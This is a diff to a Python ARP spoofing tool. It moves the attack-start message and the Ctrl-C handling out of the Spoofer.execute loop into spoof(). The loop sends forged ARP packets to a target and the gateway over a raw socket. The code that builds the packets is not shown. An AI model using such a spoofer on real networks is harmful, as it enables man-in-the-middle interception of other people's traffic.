@@ -94,15 +94,10 @@ class Spoofer(object):
     def execute(self):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
-            print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
-                  'abort.'.format(time.strftime("%H:%M:%S", time.localtime())))
             while True:
-                try:
-                    sock.send(self.target_arp_pkt)
-                    sock.send(self.gateway_arp_pkt)
-                    time.sleep(self.interval)
-                except KeyboardInterrupt:
-                    raise SystemExit('[!] Aborting ARP Spoofing attack...')
+                sock.send(self.target_arp_pkt)
+                sock.send(self.gateway_arp_pkt)
+                time.sleep(self.interval)
 
 
 def spoof(args):
@@ -117,7 +112,13 @@ def spoof(args):
                       gateway_arp_packet=gate_arp_pkt,
                       target_arp_packet=target_arp_pkt,
                       interval=args.interval)
-    spoofer.execute()
+
+    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
+          'abort.'.format(time.strftime("%H:%M:%S", time.localtime())))
+    try:
+        spoofer.execute()
+    except KeyboardInterrupt:
+        raise SystemExit('[!] Aborting ARP Spoofing attack...')
 
 
 if __name__ == '__main__':
